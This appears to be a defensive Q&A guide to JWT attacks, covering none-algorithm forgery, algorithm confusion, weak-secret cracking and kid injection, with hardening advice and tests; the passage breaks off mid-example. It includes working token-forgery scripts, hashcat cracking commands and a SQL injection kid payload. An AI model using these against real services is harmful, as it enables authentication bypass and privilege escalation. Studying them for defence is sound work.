## Section 1: The `none` Algorithm Attack

**Q1. What is the `none` algorithm attack, and why does it exist as a vulnerability class?**
A: The `none` algorithm attack exploits a flaw in how some JWT libraries implement the RFC 7519 spec. The spec includes `"alg": "none"` to represent unsigned, "plaintext" JWTs — tokens with no signature at all. The spec intended this for use in contexts where integrity is already guaranteed by the transport layer (e.g., direct HTTPS connections between fully trusted parties). The attack arises when a library trusts the `alg` field from the token header and, upon seeing `"none"`, skips signature verification entirely — treating the token as valid regardless of the payload contents.

The structural mechanics:

```
Legitimate RS256 token:
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9   ← header: {"alg":"RS256","typ":"JWT"}
.
eyJzdWIiOiJ1c2VyXzEyMyIsInJvbGUiOiJ1c2VyIn0  ← payload: {"sub":"user_123","role":"user"}
.
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c   ← valid RSA signature

Attacker's forged token:
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0       ← header: {"alg":"none","typ":"JWT"}
.
eyJzdWIiOiJ1c2VyXzEyMyIsInJvbGUiOiJhZG1pbiJ9  ← payload: {"sub":"user_123","role":"admin"}
.
                                                 ← empty signature (trailing dot only)
```

The attacker decodes the legitimate token (trivial — Base64URL), modifies the payload (`"role":"user"` → `"role":"admin"`), replaces the header's `alg` with `"none"`, re-encodes both, and appends an empty signature. A vulnerable library receiving this token looks at the header, sees `alg: none`, skips all signature verification, and happily extracts the tampered payload.

**Q2. Which real libraries were vulnerable, and what CVEs were assigned?**
A: The `none` attack was not theoretical — it was exploited against production libraries:

- **`python-jose`** — vulnerable before 2015 patches; accepted `none` and also `None`, `NONE`, `nOnE` (case-insensitive matching of the algorithm string).
- **`node-jsonwebtoken`** (Auth0) — CVE-2015-9235; the `jwt.verify()` function with a `secretOrPublicKey` parameter would still accept `alg: none` tokens in certain call patterns.
- **`auth0-java`** — vulnerable to `none` in early versions.
- **`php-jwt`** (Firebase) — CVE-2021-46743; accepted algorithm `none` when the token header specified it.
- **`ruby-jwt`** — versions before 2.x allowed `none` in the default `decode` call without explicit algorithm specification.

The breadth of affected libraries across languages reveals that this was a systematic misreading of the spec by library authors — not an isolated implementation bug. The spec describes `none` as a valid algorithm value, and libraries implemented it faithfully without recognizing that server-side verification should *never* accept a client-controlled algorithm selection.

**Q3. Walk through the exact bytes of a `none` attack token.**
A:

```python
import base64, json

def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

def b64url_decode(s: str) -> bytes:
    pad = 4 - len(s) % 4
    return base64.urlsafe_b64decode(s + "=" * pad)

# Step 1: Decode a legitimate token (attacker intercepts this)
legitimate_token = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXzEyMyIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzAwMDAzNjAwfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
parts = legitimate_token.split(".")
orig_payload = json.loads(b64url_decode(parts[1]))
print(orig_payload)
# {"sub": "user_123", "role": "user", "exp": 1700003600}

# Step 2: Modify the payload
orig_payload["role"] = "admin"
orig_payload["sub"] = "user_123"  # same user, escalated role

# Step 3: Forge the token with alg=none
forged_header  = b64url_encode(json.dumps({"alg": "none", "typ": "JWT"}).encode())
forged_payload = b64url_encode(json.dumps(orig_payload).encode())
forged_token   = f"{forged_header}.{forged_payload}."  # trailing dot = empty signature

print(forged_token)
# eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ1c2VyXzEyMyIsInJvbGUiOiJhZG1pbiIsImV4cCI6MTcwMDAwMzYwMH0.
```

Note the trailing dot — the token has three parts, but the third (signature) is empty. Some early parsers also accepted the token without the trailing dot (two parts). Modern libraries should reject both; they should only accept a token where the signature segment is non-empty and cryptographically valid for the declared algorithm — and the declared algorithm must be in the server's allowlist.

**Q4. What are all the `none` variants an attacker may try, and how do you defend against every one of them?**
A: Attackers probe multiple casing and encoding variants because library string comparisons are sometimes case-insensitive or encoding-aware:

```
"none"   "None"   "NONE"   "nOnE"   "NoNe"
"none "  " none"  "none\t"           ← whitespace padding
"n\u006fne"                           ← Unicode escape for 'o'
""                                    ← empty string (some parsers default to none)
```

The only correct defense is an **explicit algorithm allowlist** on the verifying side — not a blocklist:

```python
# WRONG: blocklist approach (fragile, attacker finds variants you missed)
BLOCKED_ALGORITHMS = {"none", "None", "NONE"}
if header["alg"] in BLOCKED_ALGORITHMS:
    raise ValueError("Invalid algorithm")
decoded = jwt.decode(token, key)  # still dangerous

# WRONG: no algorithm specification (library uses header's alg)
decoded = jwt.decode(token, public_key)

# CORRECT: explicit allowlist — if alg isn't in this list, verification fails
decoded = jwt.decode(
    token,
    key=public_key,
    algorithms=["RS256"],  # only RS256 accepted; anything else is rejected
)
```

With a proper allowlist, `"none"` in any form is rejected not because you checked for it, but because it simply isn't `"RS256"`. The allowlist approach is robust against all variants by construction — you're not trying to enumerate what's bad, you're defining exactly what's acceptable.

Additional hardening:
- If your library has a separate flag to disable `none` support at initialization, set it.
- Reject tokens where the header's `alg` doesn't match the key type you're using (RSA key + HS256 claim = reject immediately, before signature verification).
- In code review, flag any JWT decode call that does not pass an explicit `algorithms` parameter.

## Section 2: Algorithm Confusion (Key Confusion) Attack

**Q5. What is the algorithm confusion attack, and what is the underlying assumption it exploits?**
A: The algorithm confusion attack (also called the key confusion attack) targets JWT verifiers that accept both HS256 (symmetric) and RS256 (asymmetric) for the same endpoint without enforcing which algorithm a given key is intended for. The attack exploits a category error: the server's RSA *public key* — which is distributed openly — is reused as the HMAC *secret* in an HS256-signed forged token.

The flawed assumption in vulnerable implementations:

```
Vulnerable verifier logic:
1. Read alg from token header
2. If alg == "RS256": verify with RSA public key
3. If alg == "HS256": verify with... whatever key is configured
   → if the configured key happens to be the RSA public key bytes, the HMAC check passes
```

Since RSA public keys are public (that's the point of asymmetric crypto), the attacker has everything they need:

```
Attacker obtains public key → uses it as HMAC secret → signs forged token with HS256
Verifier receives token → reads alg=HS256 → computes HMAC with its own public key
→ HMAC matches (attacker used the same key) → token accepted
```

The public key was never secret, yet the attacker forged a valid token.

**Q6. Walk through a complete algorithm confusion attack step by step.**
A:

```python
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.hmac import HMAC
import base64, json, hashlib, hmac as hmac_lib

# Step 1: Attacker obtains the server's RSA public key
# (fetched from https://auth.myorg.com/.well-known/jwks.json or directly)
# For the attack, we need the raw PEM bytes of the public key
public_key_pem = b"""-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA2a2rwplBQLF29amygykE
...
-----END PUBLIC KEY-----"""

# Step 2: Construct a malicious payload
header  = {"alg": "HS256", "typ": "JWT"}  # ← claim HS256 instead of RS256
payload = {"sub": "user_123", "role": "admin", "exp": 9999999999}

def b64url(data):
    return base64.urlsafe_b64encode(
        json.dumps(data).encode()
    ).rstrip(b"=").decode()

signing_input = f"{b64url(header)}.{b64url(payload)}"

# Step 3: Sign with HMAC-SHA256 using the PUBLIC KEY as the HMAC secret
# The public key PEM bytes are used as the raw secret
signature = hmac_lib.new(
    public_key_pem,           # ← public key bytes used as HMAC secret
    signing_input.encode(),
    hashlib.sha256
).digest()

sig_encoded = base64.urlsafe_b64encode(signature).rstrip(b"=").decode()
forged_token = f"{signing_input}.{sig_encoded}"

# Step 4: Submit to the vulnerable endpoint
# POST /api/sensitive
# Authorization: Bearer <forged_token>
#
# Vulnerable verifier:
#   reads alg=HS256 from header
#   computes HMAC-SHA256(public_key_pem, signing_input)
#   compares with signature → MATCH → accepts token
```

The attack requires no knowledge of the private key and no brute-forcing. The only inputs are: the public key (publicly available), and the ability to construct a JWT header/payload. The computational cost is a single HMAC operation.

**Q7. What does a vulnerable vs. correct verifier look like in code?**
A:

```python
# VULNERABLE: accepts the algorithm from the token header
import jwt  # python-jwt or similar

def verify_token_VULNERABLE(token: str, public_key: str) -> dict:
    # No algorithms parameter → library uses whatever alg the header declares
    # If header says HS256, library will try HMAC with public_key as secret
    return jwt.decode(token, public_key)  # ← DO NOT DO THIS

# VULNERABLE: allows multiple algorithms including HS256 for an RS256-keyed endpoint
def verify_token_ALSO_VULNERABLE(token: str, public_key: str) -> dict:
    return jwt.decode(
        token,
        public_key,
        algorithms=["HS256", "RS256"],  # ← accepting both enables the confusion attack
    )

# CORRECT: strict single-algorithm allowlist matching the key type
def verify_token_CORRECT(token: str, public_key: str) -> dict:
    return jwt.decode(
        token,
        public_key,
        algorithms=["RS256"],  # ← only RS256; HS256 header triggers rejection
    )
```

```go
// CORRECT Go equivalent (using github.com/golang-jwt/jwt/v5)
func verifyToken(tokenString string, publicKey *rsa.PublicKey) (*jwt.Token, error) {
    return jwt.Parse(tokenString, func(token *jwt.Token) (interface{}, error) {
        // Verify the algorithm is exactly what we expect BEFORE returning the key
        if _, ok := token.Method.(*jwt.SigningMethodRSA); !ok {
            return nil, fmt.Errorf("unexpected signing method: %v", token.Header["alg"])
        }
        return publicKey, nil
    })
    // jwt.Parse with a keyFunc that type-asserts the method is RS256-family
    // Any other algorithm causes keyFunc to return an error → parse fails
}
```

The Go pattern is particularly instructive: the `keyFunc` callback receives the parsed (but unverified) token including its header. The type assertion `token.Method.(*jwt.SigningMethodRSA)` fails if the algorithm is HS256 (which would be `*jwt.SigningMethodHMAC`), returning an error before the library even attempts key selection or verification.

**Q8. Are RS256 and ES256 both vulnerable to algorithm confusion, or only RS256?**
A: Both are potentially vulnerable to the same *class* of attack if the verifier naively trusts the header's `alg` and has access to the corresponding public key. However, the practical exploitability differs:

**RS256 (RSA) — directly exploitable.** The public key is typically distributed as a PEM file or JWKS entry. The raw bytes of the PEM-encoded public key are a stable, deterministic value the attacker can obtain and use as the HMAC secret directly. The attack is straightforward as demonstrated in Q6.

**ES256 (ECDSA) — exploitable but slightly more involved.** The ECDSA public key is an elliptic curve point, not a simple byte string. The attacker must serialize it in the exact format the vulnerable library uses as the HMAC input — typically the PEM-encoded SubjectPublicKeyInfo bytes. If the library serializes the key differently before passing it to HMAC, the attack signature won't match. In practice, this is still exploitable with knowledge of the library's key serialization path.

**Symmetric algorithms (HS256 → HS512 confusion)** — if a server accepts both HS256 and HS512 with the same secret, downgrade attacks can influence which HMAC variant is used, potentially enabling length-extension attacks on the secret. A separate but related confusion class.

The root cause in all cases is identical: the `alg` field in a JWT header is **attacker-controlled data**. Allowing it to influence which algorithm or which key is used for verification — without independent verification of that claim — is the vulnerability. The fix is always: the server decides the algorithm and key, not the token.

**Q9. How do you prevent algorithm confusion at the library, service, and infrastructure levels?**
A:

**Library level:**
```python
# Always pass algorithms as a strict allowlist
jwt.decode(token, key=public_key, algorithms=["RS256"])

# Use libraries that separate key types from algorithm choices
# python-jose: use the JWK key object which encodes allowed algorithms
from jose import jwk, jwt as jose_jwt
key = jwk.construct(public_key_pem, algorithm="RS256")
# This key object will only verify RS256 tokens — cannot be used for HMAC

# Prefer libraries with first-class JWKS support that enforce key.use="sig" and key.alg
```

**Service level — validate `alg` explicitly before key lookup:**
```go
// Validate the header algorithm BEFORE fetching the key
func keyFunc(token *jwt.Token) (interface{}, error) {
    // Hard-coded expected algorithm — not read from the token
    const expectedAlg = "RS256"
    if token.Header["alg"] != expectedAlg {
        return nil, fmt.Errorf("algorithm %q not allowed, expected %q",
            token.Header["alg"], expectedAlg)
    }
    // Only after algorithm check, look up the key by kid
    kid, _ := token.Header["kid"].(string)
    return fetchPublicKey(kid)
}
```

**Infrastructure level:**
- Store RS256 public keys and HS256 secrets in separate secret manager paths. The service that verifies RS256 tokens should not have access to any HS256 secrets, and vice versa. Even a fully vulnerable library can't execute the confusion attack if the HMAC secret and RSA public key are not both present in the same process.
- Use a centralized auth middleware (e.g., an Envoy filter, a shared internal library with a hard-coded algorithm) rather than letting each service implement JWT verification independently. Reduces the surface area for misconfiguration.
- Rotate to ES256 (ECDSA P-256) for new systems — smaller tokens than RS256, same security level, and some libraries handle key type enforcement more rigidly for ECDSA than RSA.

## Section 3: Weak Secret Attack (HS256 Brute-Force)

**Q10. How does brute-forcing a weak HS256 secret work?**
A: HS256 tokens are signed with `HMAC-SHA256(secret, header.payload)`. Unlike password hashing, HMAC is fast — designed for throughput, not resistance to brute-force. If the secret is short, dictionary-based, or low-entropy, an offline brute-force attack can recover it from a single captured token.

The attack requires only the token itself — no server interaction:

```bash
# Using hashcat (GPU-accelerated) — industry-standard offline cracker
# Mode 16500 = JWT (HMAC-SHA2)
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXzEyMyIsInJvbGUiOiJ1c2VyIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c" > jwt.txt

# Dictionary attack — tries every word in rockyou.txt as the HMAC secret
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# Brute-force all alphanumeric strings up to 8 chars
hashcat -a 3 -m 16500 jwt.txt "?a?a?a?a?a?a?a?a"

# Rule-based attack — dictionary + mutations (capitalize, append numbers, leet speak)
hashcat -a 0 -m 16500 jwt.txt rockyou.txt -r best64.rule
```

Throughput on a modern GPU (RTX 4090): approximately **1.5–2 billion HMAC-SHA256 operations per second**. At that rate:
- 6-character alphanumeric secret (`[a-zA-Z0-9]` = 62 chars): 62^6 ≈ 56 billion combinations → ~28 seconds.
- 8-character alphanumeric: 62^8 ≈ 218 trillion → ~30 hours on one GPU, minutes on a cluster.
- 32-byte random secret: 256^32 possibilities → computationally infeasible regardless of hardware.

**Q11. What secrets have been found in the wild, and what makes a secret weak?**
A: Bug bounty reports and CTF write-ups document JWT secrets recovered in real systems:

| Secret found | Why it's weak |
|---|---|
| `secret` | 6 chars, dictionary word, top entry in rockyou.txt |
| `password` | 8 chars, dictionary word |
| `jwt_secret` | Slightly longer but still dictionary-based |
| `1234567890` | Pure numeric, low entropy |
| `your-256-bit-secret` | Literally from the jwt.io documentation example |
| `changeme` | Default config value that wasn't changed |
| `${APP_NAME}-jwt-secret` | Predictable pattern, reduces keyspace |
| `HS256` | Using the algorithm name as the secret |
| `""` (empty string) | Some libraries default to empty string if env var unset |
| App name + year (`myapp2023`) | Low entropy, guessable pattern |

What makes a secret weak:
1. **Short** — anything under 32 bytes is inadequate for HS256 (NIST SP 800-107 recommends the key be at least as long as the HMAC output — 32 bytes for SHA-256).
2. **Low entropy** — dictionary words, predictable patterns, or secrets derived from known strings.
3. **Reused** — using the same secret across environments (dev and prod share a secret; dev secret leaks; prod is compromised).
4. **Stored insecurely** — in `.env` files committed to git, in CI environment variable logs, in application logs.

**Q12. Walk through a secret recovery and token forgery end-to-end.**
A:

```python
# Attacker has captured a JWT from an HTTP request (network intercept, XSS, log leak)
captured_token = (
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"
    ".eyJzdWIiOiJ1c2VyXzEyMyIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzAwMDAzNjAwfQ"
    ".K7HZMiAs6nQmBJvzPGZRd7qMUgPDvlNFLFWefCbx7tI"
)

# --- PHASE 1: Secret recovery (offline, no server needed) ---
# hashcat recovers the secret: "supersecret"
recovered_secret = "supersecret"

# Verify the recovery is correct
import hmac, hashlib, base64, json

def b64url_decode(s):
    return base64.urlsafe_b64decode(s + "==")

def b64url_encode(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

parts = captured_token.split(".")
signing_input = f"{parts[0]}.{parts[1]}".encode()
expected_sig = b64url_decode(parts[2])
computed_sig = hmac.new(recovered_secret.encode(), signing_input, hashlib.sha256).digest()
assert hmac.compare_digest(computed_sig, expected_sig), "Secret is wrong"
print(f"Secret recovered: {recovered_secret}")

# --- PHASE 2: Token forgery ---
# Attacker crafts a new payload with escalated privileges
forged_payload = {
    "sub": "user_123",
    "role": "admin",          # ← escalated
    "exp": 9999999999,        # ← far future, effectively non-expiring
    "jti": "attacker-jti-1"  # ← arbitrary jti, no blocklist entry
}

new_header  = b64url_encode(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
new_payload = b64url_encode(json.dumps(forged_payload).encode())
new_signing = f"{new_header}.{new_payload}".encode()
new_sig     = hmac.new(recovered_secret.encode(), new_signing, hashlib.sha256).digest()

forged_token = f"{new_header}.{new_payload}.{b64url_encode(new_sig)}"

# This token is cryptographically valid — any verifier with the same secret will accept it
# Attacker sends: Authorization: Bearer <forged_token>
```

Once the secret is recovered, the attacker has permanent, unlimited token-minting capability. They can impersonate any `sub`, assign any `role`, set any `exp`. The only remediation is rotating the secret — which invalidates all outstanding tokens (forcing all users to re-authenticate) and requires coordinated deployment across all services that share the secret.

**Q13. How do you generate a cryptographically adequate HS256 secret, and how do you manage it?**
A: A proper HS256 secret is 32 bytes (256 bits) of cryptographically random data, stored and distributed as a secret — not a human-memorable string.

**Generation:**
```bash
# Generate 32 random bytes, base64-encoded (for storage/transmission)
openssl rand -base64 32
# Output: kG3Pp5NmVLQr7ZWx8YdB2JhFqCeAuT4sM6iR1oKvEl0=

# Or hex-encoded
openssl rand -hex 32
# Output: 8f3a1c2d4e5b6f7a8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b

# In Python: use secrets module, never random module
import secrets
secret_bytes = secrets.token_bytes(32)
secret_b64   = secrets.token_urlsafe(32)  # 32 bytes → 43-char URL-safe base64
```

```python
# In application code — load from environment, never hardcode
import os

JWT_SECRET = os.environ.get("JWT_SECRET")
if not JWT_SECRET:
    raise RuntimeError("JWT_SECRET environment variable not set")
if len(JWT_SECRET.encode()) < 32:
    raise RuntimeError("JWT_SECRET must be at least 32 bytes")
```

**Rotation procedure for HS256:**
1. Generate a new secret.
2. Configure the auth server to accept **both** the old and new secrets for verification (dual-secret mode) — so existing tokens aren't immediately invalidated.
3. Issue all new tokens signed with the new secret.
4. After the max access token TTL has elapsed (e.g., 15 minutes), remove the old secret from verification.
5. All tokens signed with the old secret are now rejected.

Some libraries support a list of secrets for verification. If yours doesn't, implement a thin wrapper that tries verification with the new secret first, falls back to the old secret only if the new one fails, and logs/alerts on old-secret matches (signals tokens still in circulation from before rotation).

**Q14. Should you use HS256 at all in a new system, given these risks?**
A: For a new system with more than one service, the answer is: prefer RS256 or ES256. The HS256 risks compound in practice:

- **Secret distribution is operationally dangerous** — every new service that needs to verify tokens must be given the secret. More copies = more exposure surface. Rotation requires coordinating a simultaneous update across every service.
- **No public verifiability** — you can't let a third party verify your tokens without giving them the secret.
- **Brute-force feasibility** — the risk is real, not theoretical. One token leak + one weak secret = full compromise.

If you are using HS256 (e.g., maintaining a legacy system, or building a small internal tool where a single service both issues and verifies tokens), the minimum bar is:
- 32 bytes of random secret from a CSPRNG.
- Secret stored in a secrets manager (AWS Secrets Manager, HashiCorp Vault), not in `.env` files or environment variable logs.
- Rotation on a defined schedule (quarterly) or immediately on any suspected exposure.
- Short token TTL (15 minutes) to limit the window of compromise if a token is captured.
- Access tokens are short-lived HS256 JWTs; refresh tokens are opaque random strings stored server-side.

For a greenfield microservices system in fintech: use RS256 or ES256. The operational cost of JWKS-based key distribution is lower than the operational cost of correctly securing and rotating a shared HMAC secret across many services.

## Section 4: Attack Chaining and Compounding Vulnerabilities

**Q15. How do these three vulnerabilities chain in a real-world attack scenario?**
A: The attacks are typically independent, but they can chain. Consider an attacker targeting a service with multiple JWT implementation weaknesses:

```
Scenario: Bug bounty target — SaaS fintech API, HS256 tokens

Step 1 — Token capture:
  Attacker finds a verbose error log endpoint that echoes the Authorization header
  in error responses. One legitimate user session → one captured JWT.
  (Source: misconfigured error handler, not a JWT vulnerability)

Step 2 — Weak secret brute-force (Q10):
  Captured token: alg=HS256
  hashcat recovers the secret in 4 minutes: "MyApp2024!"
  Now the attacker can forge any token.

Step 3 — Payload escalation:
  Attacker mints: {"sub": "user_123", "role": "admin", "exp": 9999999999}
  Signed with the recovered secret → cryptographically valid HS256 token.

Step 4 — None algorithm probe (Q1):
  Attacker tests: does the server also accept alg=none?
  Sends a none-signed token → server accepts it.
  Discovery: the algorithm check is either missing or a blocklist (not allowlist).

Step 5 — Algorithm confusion probe (Q5):
  Attacker checks if the service also has an RS256 endpoint.
  It does — a legacy API gateway sits in front.
  Attacker fetches the RS256 public key from /.well-known/jwks.json.
  Sends alg=HS256 token signed with the public key → gateway accepts it.

Outcome: Full authentication bypass via three independent paths.
Severity: Critical. Report includes PoC for all three vectors.
```

In a well-hardened system, all three are mitigated by the same root fix: **explicit algorithm allowlist that is independent of the token header**. A single correct implementation of Q4's defense prevents all three attack paths simultaneously.

**Q16. What does a comprehensive JWT security checklist look like for a code review?**
A:

```
JWT SECURITY CODE REVIEW CHECKLIST
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

ALGORITHM ENFORCEMENT
[ ] jwt.decode() / jwt.verify() always passes explicit algorithms=["RS256"] (or ["HS256"])
[ ] algorithms parameter is a whitelist of one algorithm, not a list of many
[ ] algorithms=["none"] is never present, even in test code
[ ] If RS256: keyFunc type-asserts the signing method before returning the key
[ ] If HS256: secret length >= 32 bytes validated at startup

NONE ALGORITHM
[ ] Library version is current (check CVEs for your library + version)
[ ] No call site passes algorithms=None or omits the algorithms parameter
[ ] Test: send a forged none-alg token → server returns 401, not 200

ALGORITHM CONFUSION
[ ] RS256 verifiers do not have HS256 secrets in scope (separate secret stores)
[ ] HS256 verifiers do not have RSA public keys in scope
[ ] If the service accepts both RS256 and HS256: different keys for each, separate codepaths
[ ] Test: send RS256-keyed token with alg=HS256 → server returns 401, not 200

WEAK SECRET (HS256 only)
[ ] Secret loaded from environment / secrets manager, not hardcoded
[ ] Secret length check at startup (>= 32 bytes)
[ ] Secret not logged, not present in error messages
[ ] Secret rotation procedure documented and tested

CLAIMS VALIDATION
[ ] exp validated (reject expired tokens)
[ ] iss validated against known issuer string
[ ] aud validated against this service's expected audience
[ ] jti present and checked against revocation store for sensitive operations

LIBRARY AND DEPENDENCIES
[ ] JWT library is pinned to a version with no known CVEs
[ ] Dependency audit runs in CI (e.g., pip-audit, npm audit, govulncheck)
[ ] No hand-rolled JWT parsing or signature verification
```

**Q17. How do you test your JWT implementation for all three vulnerability classes in an automated test suite?**
A:

```python
import pytest
import jwt
import time

PUBLIC_KEY  = open("test/keys/public.pem").read()
PRIVATE_KEY = open("test/keys/private.pem").read()
VALID_TOKEN = jwt.encode(
    {"sub": "user_1", "exp": int(time.time()) + 3600},
    PRIVATE_KEY, algorithm="RS256"
)

class TestJWTSecurity:

    # --- none algorithm attack ---
    def test_rejects_none_algorithm(self, client):
        """Token with alg=none must be rejected with 401."""
        import base64, json
        header  = base64.urlsafe_b64encode(
            json.dumps({"alg": "none", "typ": "JWT"}).encode()
        ).rstrip(b"=").decode()
        payload = base64.urlsafe_b64encode(
            json.dumps({"sub": "user_1", "exp": int(time.time()) + 3600}).encode()
        ).rstrip(b"=").decode()
        none_token = f"{header}.{payload}."
        resp = client.get("/api/protected", headers={"Authorization": f"Bearer {none_token}"})
        assert resp.status_code == 401

    def test_rejects_none_algorithm_uppercase(self, client):
        """Case variants of none must also be rejected."""
        for alg_variant in ["None", "NONE", "nOnE", "NoNe"]:
            forged = _forge_token_with_alg(alg_variant, {"sub": "user_1"})
            resp = client.get("/api/protected", headers={"Authorization": f"Bearer {forged}"})
            assert resp.status_code == 401, f"Failed for alg variant: {alg_variant}"

    # --- algorithm confusion attack ---
    def test_rejects_hs256_signed_with_public_key(self, client):
        """Token signed with HS256 using the RSA public key as HMAC secret must be rejected."""
        import hmac as hmac_lib, hashlib
        header  = _b64url({"alg": "HS256", "typ": "JWT"})
        payload = _b64url({"sub": "user_1", "exp": int(time.time()) + 3600})
        signing_input = f"{header}.{payload}".encode()
        # Use the RSA public key PEM bytes as the HMAC secret — the confusion attack
        sig = hmac_lib.new(PUBLIC_KEY.encode(), signing_input, hashlib.sha256).digest()
        forged = f"{header}.{payload}.{base64.urlsafe_b64encode(sig).rstrip(b'=').decode()}"
        resp = client.get("/api/protected", headers={"Authorization": f"Bearer {forged}"})
        assert resp.status_code == 401

    # --- weak secret (if applicable) ---
    def test_hs256_secret_minimum_length(self):
        """JWT_SECRET environment variable must be at least 32 bytes."""
        import os
        secret = os.environ.get("JWT_SECRET", "")
        assert len(secret.encode("utf-8")) >= 32, (
            "JWT_SECRET is too short; must be at least 32 bytes for HS256"
        )

    # --- standard validation ---
    def test_rejects_expired_token(self, client):
        expired = jwt.encode(
            {"sub": "user_1", "exp": int(time.time()) - 1},
            PRIVATE_KEY, algorithm="RS256"
        )
        resp = client.get("/api/protected", headers={"Authorization": f"Bearer {expired}"})
        assert resp.status_code == 401

    def test_rejects_wrong_algorithm_tampered_header(self, client):
        """Token with valid RS256 signature but tampered alg header must be rejected."""
        parts = VALID_TOKEN.split(".")
        tampered_header = _b64url({"alg": "HS256", "typ": "JWT"})
        tampered_token  = f"{tampered_header}.{parts[1]}.{parts[2]}"
        resp = client.get("/api/protected", headers={"Authorization": f"Bearer {tampered_token}"})
        assert resp.status_code == 401

    def test_accepts_valid_token(self, client):
        """Sanity check — valid RS256 token is accepted."""
        resp = client.get("/api/protected", headers={"Authorization": f"Bearer {VALID_TOKEN}"})
        assert resp.status_code == 200
```

These tests should run in CI on every pull request. The `test_rejects_hs256_signed_with_public_key` and `test_rejects_none_algorithm` tests are the two most important — they directly verify that the attacks in Sections 1 and 2 don't work against your implementation.

## Section 5: Library-Specific Hardening and Ecosystem Patterns

**Q18. How do you pick a JWT library, and what properties should you evaluate?**
A: Library selection is a security decision, not just an API convenience decision. Evaluation criteria:

**1. Explicit algorithm enforcement** — does the library require you to pass an `algorithms` parameter? Does it raise an error if you omit it, or silently use whatever the token header claims?

```python
# Bad library behavior: no error if algorithms omitted
jwt.decode(token, key)  # uses alg from header — dangerous default

# Good library behavior: error if algorithms omitted
jwt.decode(token, key)
# → AlgorithmNotAllowedError: algorithms must be specified
```

**2. CVE history** — check NVD (nvd.nist.gov) and the library's GitHub issues for past JWT-related CVEs. A library with one patched CVE and a clear post-mortem is better than one with zero CVEs because nobody has audited it.

**3. Active maintenance** — JWT attack research is ongoing. A library last updated in 2019 hasn't incorporated defenses against attack classes discovered since then.

**4. JWKS support** — for RS256/ES256, does the library support fetching, caching, and automatically refreshing JWKS? Manual JWKS handling is error-prone.

**5. Strict defaults** — does the library validate `exp`, `nbf`, `iss`, and `aud` by default, or do you have to opt in? Opt-in validation means one missed parameter = silent vulnerability.

Library recommendations by language (as of mid-2025):

| Language | Recommended | Avoid |
|---|---|---|
| Python | `python-jose` (with `cryptography` backend), `authlib` | `PyJWT < 2.x` (older versions had algorithm confusion issues) |
| Go | `github.com/golang-jwt/jwt/v5`, `github.com/lestrrat-go/jwx/v2` | Hand-rolled implementations |
| Node.js | `jose` (panva), `jsonwebtoken >= 9.x` | `jsonwebtoken < 8.5.1` (CVE-2022-23529) |
| Java | `nimbus-jose-jwt`, `java-jwt >= 4.x` | Older `jjwt` versions with `none` support |
| Ruby | `jwt >= 2.x` | `jwt < 2.0` (allowed `none` without explicit opt-out) |

**Q19. How does a centralized auth middleware pattern eliminate per-service JWT vulnerability risk?**
A: Instead of each microservice implementing its own JWT verification, a centralized middleware intercepts all requests and performs validation once:

```
┌──────────────────────────────────────────────────────────────┐
│  API Gateway / Ingress (Envoy, Kong, NGINX + lua plugin)     │
│                                                              │
│  For every request:                                          │
│  1. Extract Authorization: Bearer <token>                    │
│  2. Verify JWT: alg=RS256 only, fetch JWKS, check exp/iss/aud│
│  3. On failure: return 401, do not forward request           │
│  4. On success: strip the JWT, add X-User-ID / X-User-Role   │
│     headers derived from the verified payload                 │
└──────────────────────────┬───────────────────────────────────┘
                           │ verified request with headers
          ┌────────────────┼──────────────────┐
          ▼                ▼                  ▼
   Loans Service     Payments Service    Admin Service
   (reads X-User-ID  (reads X-User-ID)  (reads X-User-Role)
    no JWT parsing)   no JWT parsing)    no JWT parsing)
```

Benefits:
- JWT verification logic exists in **one place** — one place to audit, one place to update when a new attack class emerges.
- Downstream services trust the gateway's headers — they do not need JWT libraries at all. No per-service risk of misconfigured `algorithms` parameter, no `none` attack surface, no algorithm confusion surface.
- Uniform policy enforcement — changing from RS256 to ES256, adding `jti` revocation checks, or enforcing a new `aud` claim requires one change at the gateway, not N changes across N services.

Caveats:
- The gateway is a high-value target — if it's compromised, all services are bypassed. Harden the gateway with the same rigor as the auth server.
- Service-to-service calls (within the cluster, bypassing the gateway) still need a verification strategy — typically mTLS or service mesh identity (SPIFFE/SPIRE), not JWT.
- The X-User-* headers must only be trusted if they originate from the gateway — downstream services must reject these headers if they arrive from external clients. Configure the gateway to strip any incoming X-User-* headers before adding its own.

**Q20. What is the `kid` injection attack, and how does it relate to JWT vulnerabilities?**
A: The `kid` (Key ID) field in the JWT header is used to tell the verifier which key to use for verification. If the server uses `kid` to look up a key from a database or file system without sanitization, the `kid` value becomes an injection vector.

**SQL injection via `kid`:**
```sql
-- Vulnerable verifier pseudocode:
key = db.query(f"SELECT key_value FROM jwt_keys WHERE kid = '{token.header['kid']}'")

-- Attacker sets kid to:
kid = "' UNION SELECT 'attacker_secret' --"

-- Resulting query:
SELECT key_value FROM jwt_keys WHERE kid = '' UNION SELECT 'attacker_secret' --'

-- Returns: 'attacker_secret'
-- Attacker signs their token with 'attacker_secret'
-- Verifier fetches 'attacker_secret' as the key → verification succeeds
```

**Path traversal via `kid`:**
```
-- Vulnerable verifier reads key from filesystem:
key_path = f"/app/keys/{token.header['kid']}.pem"
key = open(key_path).read()

-- Attacker sets kid to:
